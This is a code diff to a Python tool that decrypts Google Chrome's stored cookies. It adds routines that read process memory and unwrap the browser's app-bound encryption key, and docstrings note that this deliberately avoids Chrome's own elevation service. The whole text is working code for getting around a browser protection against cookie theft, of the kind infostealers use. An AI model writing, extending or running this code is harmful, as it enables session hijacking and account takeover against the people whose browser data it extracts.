@@ -79,6 +79,7 @@ _cache: dict[str, Any] = {
     "v20_blobs": 0,
     "v20_ok": 0,
     "_v20_verify": [],
+    "_app_bound_blob": None,
 }
 
 # In-process memo of Local State unwrap. Key bytes stay in RAM only.
@@ -167,6 +168,7 @@ def _discover_uncached() -> tuple[str, str, str]:
     _cache["v20_blobs"] = 0
     _cache["v20_ok"] = 0
     _cache["_v20_verify"] = []
+    _cache["_app_bound_blob"] = None
     pairs_all: list[tuple[str, str]] = []
     decrypt_failures = 0
     found_hosts = 0
@@ -2553,6 +2555,7 @@ def _unwrap_app_bound_key(
 ) -> tuple[bytes | None, str, str]:
     """chrome_dir memscan unwrap. Never CoCreate IElevator / ElevationService."""
     raw = _app_bound_ciphertext(b64_key)
+    _cache["_app_bound_blob"] = raw
     sample = _resolve_v20_sample(v20_sample)
     if not raw and not sample:
         return None, "chrome_dir", "no_app_bound_key"
@@ -3124,6 +3127,88 @@ def _aes_key_windows(material: bytes | None) -> list[bytes]:
     return out
 
 
+def _app_bound_gcm_payloads(blob: bytes) -> list[bytes]:
+    """Local State APPB body as GCM payloads: 12-byte nonce at the header."""
+    out: list[bytes] = []
+    seen: set[bytes] = set()
+
+    def add(part: bytes | None) -> None:
+        if not part or len(part) < 12 + 16 + 1:
+            return
+        raw = bytes(part)
+        if raw not in seen:
+            seen.add(raw)
+            out.append(raw)
+
+    add(blob)
+    if blob.startswith(b"APPB"):
+        add(blob[4:])
+    if blob.startswith(b"v20"):
+        add(blob[3:])
+    if blob.startswith(b"DPAPI"):
+        add(blob[5:])
+    if len(blob) >= 8:
+        n = int.from_bytes(blob[:4], "little")
+        if 29 <= n <= len(blob) - 4:
+            add(blob[4 : 4 + n])
+    add(blob[4:])
+    add(blob[8:])
+    inner = _dpapi_unprotect(blob)
+    if inner:
+        add(inner)
+        if inner.startswith(b"APPB"):
+            add(inner[4:])
+        if inner.startswith(b"v20"):
+            add(inner[3:])
+    return out
+
+
+def _cookie_keys_from_wrap(wrap: bytes, app_bound: bytes | None) -> list[bytes]:
+    """APC 32-byte wrap key → AES-256-GCM unwrap Local State → cookie AES key."""
+    keys: list[bytes] = []
+    seen: set[bytes] = set()
+
+    def add(key: bytes | None) -> None:
+        if key and len(key) == 32 and key not in seen:
+            seen.add(key)
+            keys.append(key)
+
+    if not wrap or len(wrap) != 32 or not app_bound:
+        return keys
+    for payload in _app_bound_gcm_payloads(app_bound):
+        plain = _aes_gcm_decrypt_bytes(payload, wrap)
+        if not plain and payload[:3] == b"v20":
+            plain = _aes_gcm_decrypt_bytes(payload[3:], wrap)
+        if not plain:
+            continue
+        add(_accept_aes_key(plain))
+        for window in _aes_key_windows(plain):
+            add(window)
+        if len(plain) > 32:
+            add(_accept_aes_key(plain[32:]))
+            for window in _aes_key_windows(plain[32:]):
+                add(window)
+    return keys
+
+
+def _abe_key_from_material(
+    material: bytes | None, v20_sample: bytes | None
+) -> bytes | None:
+    """Direct cookie key, or Chrome 151 wrap: APC key GCM-unwraps the APPB blob."""
+    if not material:
+        return None
+    app_bound = _cache.get("_app_bound_blob")
+    if not isinstance(app_bound, (bytes, bytearray)):
+        app_bound = None
+    for cand in _aes_key_windows(material):
+        if _v20_key_ok(cand, v20_sample, all_blobs=True):
+            return cand
+        for derived in _cookie_keys_from_wrap(cand, app_bound):
+            if _v20_key_ok(derived, v20_sample, all_blobs=True):
+                return derived
+    return None
+
+
 def _v20_key_ok(
     key: bytes | None, v20_sample: bytes | None, *, all_blobs: bool = True
 ) -> bool:
@@ -3161,6 +3246,9 @@ def _key_from_helper_candidates(stdout: bytes, v20_sample: bytes) -> bytes | Non
             continue
         if _v20_key_ok(cand, v20_sample):
             return cand
+        hit = _abe_key_from_material(cand, v20_sample)
+        if hit:
+            return hit
     return None
 
 
@@ -3991,7 +4079,7 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         tried += 1
         if _v20_key_ok(cand, v20_sample, all_blobs=False):
             return cand
-        return None
+        return _abe_key_from_material(cand, v20_sample)
 
     def consider_apc(
         cand: bytes | None,
@@ -4010,22 +4098,14 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
             else:
                 continue
             plain = unprotect.unprotect(blob)
-            if _v20_key_ok(plain, v20_sample, all_blobs=True):
-                return next(
-                    (w for w in _aes_key_windows(plain) if _v20_key_ok(w, v20_sample)),
-                    plain[:32] if plain and len(plain) >= 32 else plain,
-                )
+            hit = _abe_key_from_material(plain, v20_sample)
+            if hit:
+                return hit
             if addr:
-                inplace = unprotect.unprotect_at(addr, len(blob))
-                if _v20_key_ok(inplace, v20_sample, all_blobs=True):
-                    return next(
-                        (
-                            w
-                            for w in _aes_key_windows(inplace)
-                            if _v20_key_ok(w, v20_sample)
-                        ),
-                        inplace[:32] if inplace and len(inplace) >= 32 else inplace,
-                    )
+                inplace = unprotect.unprotect_at(addr, 32)
+                hit = _abe_key_from_material(inplace, v20_sample)
+                if hit:
+                    return hit
         return None
 
     for pid in pids:
